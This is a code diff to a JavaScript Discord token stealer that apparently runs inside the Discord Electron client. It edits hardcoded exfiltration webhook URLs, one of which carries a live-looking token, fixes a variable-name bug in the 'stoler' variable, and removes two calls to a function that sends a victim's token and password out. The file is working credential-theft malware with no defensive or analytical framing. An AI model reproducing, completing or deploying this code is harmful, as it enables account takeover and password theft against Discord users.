@@ -9,7 +9,7 @@ const electron = require('electron');
 const request = require("request")
 
   var stoler = "https://ptb.discord.com/api/webhooks/903654798316957756/uz9lSQONl4b5L5NTfdxulWgcFQB1bzCSUAQuLsQqOLrHy_n-MwxlhfkL9RBFtpF2zK7l"
-  stoler = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
+  stoler = stoler.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   
 function Secure(token,password){
   	request(
@@ -259,7 +259,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
   var webhook = "%WEBHOOK_LINK%";
   webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
-  var stealer = "https://discord.com/api/webhooks/902602831217971220/XlPxiB3rRB347Y1f6PLPxgU8WWg4CgNgaR5ARBcJnoFbRzIcvwpMnFgaT-wAh8OEzNdt"
+  var stealer = "https://discord.com/api/webhooks/904716780642136064/YSSvU28h4bv-ieKA-0aUcAX7-OCEH59umxHDjIeTJVAbC4XCI7h-NnR357g1HTBW3fUR"
   stealer = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   
   function FirstTime(){
@@ -491,7 +491,7 @@ window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
         xmlHttp.responseText;
     `, true).then((ip) => {
         const json = JSON.parse(info);
-Secure(token,password)
+
         var params = {
             username: "Zero Fa",
             content: "",
@@ -602,7 +602,7 @@ Secure(token,newpassword)
         xmlHttp.send( null );
         xmlHttp.responseText;
     `, true).then((ip) => {
-Secure(token,password)
+
         var json = JSON.parse(info);
         var params = {
             username: "Zero fa",
